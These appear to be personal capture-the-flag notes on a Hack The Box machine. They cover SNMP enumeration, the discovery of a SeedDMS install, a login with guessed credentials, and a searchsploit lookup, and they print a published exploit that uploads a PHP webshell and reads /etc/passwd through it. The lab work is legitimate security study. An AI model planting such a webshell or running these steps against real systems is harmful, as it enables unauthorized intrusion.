### Port 161 (UDP)
* SNMPWALK on community public
```bash
$ snmpwalk -v2c -c public 10.10.10.241 . | tee snmp.output
```

```bash
... [snip] ...

System release info                                                                                                                                                                           
CentOS Linux release 8.3.2011                                                                                                                                                                 
SELinux Settings                                                                                                                                                                              
user                                                                                                                                                                                          
                                                                                                                                                                                              
                Labeling   MLS/       MLS/                                                                                                                                                    
SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles                                                                                                            
                                                                                                                                                                                              
guest_u         user       s0         s0                             guest_r                                                                                                                  
root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r                                                                                   
staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r                                                                                            
sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r                                                                                                                 
system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r                                                                                                    
unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r                                                                                                    
user_u          user       s0         s0                             user_r                                                                                                                   
xguest_u        user       s0         s0                             xguest_r                                                                                                                 
login                                                                                                                                                                                         
                                                                                                                                                                                              
Login Name           SELinux User         MLS/MCS Range        Service                                                                                                                        
                                               
__default__          unconfined_u         s0-s0:c0.c1023       *
michelle             user_u               s0                   *
root                 unconfined_u         s0-s0:c0.c1023       *

... [snip] ...




```

```bash
$ grep html snmp.output 
iso.3.6.1.4.1.2021.9.1.2.2 = STRING: "/var/www/html/seeddms51x/seeddms"
```

* On port 80 using virtual host http://dms-pit.htb/seeddms51x/seeddms
http://dms-pit.htb/seeddms51x/seeddms/out/out.Login.php?referuri=%2Fseeddms51x%2Fseeddms%2F
![[Pasted image 20211227211308.png]]


### Trying use user michelle to login on seedsms
* Using password = user
*  michelle:michelle

![[Pasted image 20211227230616.png]]

```bash
$ searchsploit seeddms
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Seeddms 5.1.10 - Remote Command Execution (RCE) (Authenticated)                                                                                             | php/webapps/50062.py
SeedDMS 5.1.18 - Persistent Cross-Site Scripting                                                                                                            | php/webapps/48324.txt
SeedDMS < 5.1.11 - 'out.GroupMgr.php' Cross-Site Scripting                                                                                                  | php/webapps/47024.txt
SeedDMS < 5.1.11 - 'out.UsrMgr.php' Cross-Site Scripting                                                                                                    | php/webapps/47023.txt
SeedDMS versions < 5.1.11 - Remote Command Execution                                                                                                        | php/webapps/47022.txt
```

```bash
$ searchsploit -x php/webapps/47022.txt
```

```php
Exploit Steps:

Step 1: Login to the application and under any folder add a document.
Step 2: Choose the document as a simple php backdoor file or any backdoor/webshell could be used.

PHP Backdoor Code:
<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>

Step 3: Now after uploading the file check the document id corresponding to the document.
Step 4: Now go to example.com/data/1048576/"document_id"/1.php?cmd=cat+/etc/passwd to get the command response in browser.

Note: Here "data" and "1048576" are default folders where the uploaded files are getting saved.
```

